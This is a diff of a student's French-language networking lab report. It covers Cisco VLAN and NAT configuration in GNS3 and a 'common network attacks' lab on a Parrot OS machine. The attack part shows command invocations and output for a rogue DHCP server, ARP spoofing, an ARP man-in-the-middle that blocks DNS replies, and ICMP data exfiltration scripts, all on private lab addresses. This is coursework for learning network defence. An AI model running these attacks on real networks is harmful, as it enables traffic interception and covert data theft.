@@ -16,9 +16,9 @@
 ---
 
 ## TP1: Premiers pas GNS, Cisco et VLAN
-### Section 1
+### 🌞 Commençons simple
 ```
-🌞 Commençons simple
+
 1 -
 	PC1> ip 10.3.1.1/24
 	Checking for duplicate address...
@@ -48,12 +48,10 @@
 	   1    0050.7966.6801    DYNAMIC     Et0/1
 	Total Mac Addresses for this criterion: 2
 
-II. VLAN
 ```
-
-### Section 2
+### II. VLAN
+### 🌞 Adressage
 ```
-🌞 Adressage
 1 -
 	PC3> ip 10.3.1.3/24
 	Checking for duplicate address...
@@ -77,9 +75,8 @@ II. VLAN
 
 ```
 
-### Section 3
-```
 🌞 Configuration des VLANs
+```
 1 - 
 	IOU1#conf t
 	Enter configuration commands, one per line.  End with CNTL/Z.
@@ -107,12 +104,11 @@ II. VLAN
 	IOU1(config)#int eth0/2   
 	IOU1(config-if)#sw ac Vlan 20
 	IOU1(config-if)#exit
-
 ```
 
-### Section 4
+### 🌞 Vérif
 ```
-🌞 Vérif
+
 1 -
 	PC1> ping 10.3.1.2
 
@@ -145,14 +141,11 @@ II. VLAN
 	PC3> ping 10.3.1.2
 
 	host (10.3.1.2) not reachable
-
-III. Ptite VM DHCP
 ```
 
-### Section 5
+### III. Ptite VM DHCP
+### 🌞 VM dhcp.tp3.b2 
 ```
-🌞 VM dhcp.tp3.b2 
-
 	PC4> ip dhcp
 	DDORA IP 10.3.1.101/24 GW 10.3.1.254
 
@@ -174,14 +167,12 @@ III. Ptite VM DHCP
 	DDD
 	Can't find dhcp server
 
-
-
 ```
 
 ## TP2: Common network attacks
 ### Section 1
+###🌞 Le routeur doit pouvoir joindre internet
 ```
-🌞 Le routeur doit pouvoir joindre internet
 1 -
 	R1(config-if)#ip add dhcp
 
@@ -202,9 +193,9 @@ III. Ptite VM DHCP
 
 ```
 
-### Section 2
+### 🌞 Configuration d'un NAT simpliste
 ```
-🌞 Configuration d'un NAT simpliste
+
 	R1(config)#int fa0/0
 	R1(config-if)#ip nat outside
 
@@ -236,9 +227,8 @@ III. Ptite VM DHCP
 	
 ```
 
-### Section 3
+### 🌞 Proof !
 ```
-🌞 Proof !
 	PC1> ping 1.1.1.1
 
 	84 bytes from 1.1.1.1 icmp_seq=1 ttl=126 time=40.236 ms
@@ -265,18 +255,13 @@ III. Ptite VM DHCP
 	84 bytes from 1.1.1.1 icmp_seq=3 ttl=126 time=34.091 ms
 	84 bytes from 1.1.1.1 icmp_seq=4 ttl=126 time=44.497 ms
 	84 bytes from 1.1.1.1 icmp_seq=5 ttl=126 time=34.544 ms
-
-
-II - Atk this
-
-2 - Attaques DHCP
-
 ```
 
-### Section 4
+### II - Atk this
+### 2 - Attaques DHCP
+### 🌞 Mettre en place un serveur DHCP sur la machine attaquante
 ```
-	🌞 Mettre en place un serveur DHCP sur la machine attaquante
-		┌─[user@parrot]─[~/Documents/tp2]
+			┌─[user@parrot]─[~/Documents/tp2]
 		└──╼ $sudo nano /etc/dnsmasq.conf
 		┌─[user@parrot]─[~/Documents/tp2]
 		└──╼ $sudo vi /etc/dnsmasq.conf
@@ -309,10 +294,9 @@ II - Atk this
 
 ```
 
-### Section 5
+### 🌞 Mettez en place un ARP spoofing
 ```
-	🌞 Mettez en place un ARP spoofing
-
+	
 		PC1> show arp
 
 		ca:01:16:e1:00:00  10.2.1.254 expires in 33 seconds 
@@ -322,10 +306,9 @@ II - Atk this
 
 ```
 
-### Section 6
+### 🌞 Mettez en place un Man-in-the-middle ARP
 ```
-	🌞 Mettez en place un Man-in-the-middle ARP
-
+	
 		┌─[✗]─[user@parrot]─[~/Documents]
 		└──╼ $sudo python arp_mitm.py 10.2.1.51 10.2.1.254
 		Envoyé : 10.2.1.254 est 08:00:27:52:78:05 à 10.2.1.51
@@ -384,15 +367,11 @@ II - Atk this
 	Réponse DNS légitime pour efrei.fr. bloquée.
 	Réponse DNS légitime pour efrei.fr. bloquée.
 
-
-5 - Exfiltration ICMP
-
-A. Basics
 ```
-
-### Section 7
+### 5 - Exfiltration ICMP
+### A. Basics
+### 🌞 Exfiltration ICMP basique
 ```
-🌞 Exfiltration ICMP basique
 
 	┌─[user@parrot]─[~/Documents/Exfiltration]
 	└──╼ $sudo python3 icmp_basic_exfiltr.py 10.2.1.51 "Hello World"
@@ -400,9 +379,8 @@ A. Basics
 
 ```
 
-### Section 8
+### 🌞 Receiver exfiltration ICMP basique
 ```
-🌞 Receiver exfiltration ICMP basique
 
 	┌─[user@parrot]─[~/Documents/Exfiltration]
 	└──╼ $sudo python3 icmp_basic_receiver.py
@@ -428,14 +406,12 @@ A. Basics
 
 	 123456789:;<=>?
 
-
-B. File exfiltration
 ```
 
-### Section 9
-```
-🌞 File exfiltration
+### B. File exfiltration
 
+### 🌞 File exfiltration
+```
 	┌─[user@parrot]─[~/Documents/Exfiltration]
 	└──╼ $sudo python icmp_file_receiver.py
 	En attente de fichiers exfiltrés via ICMP...
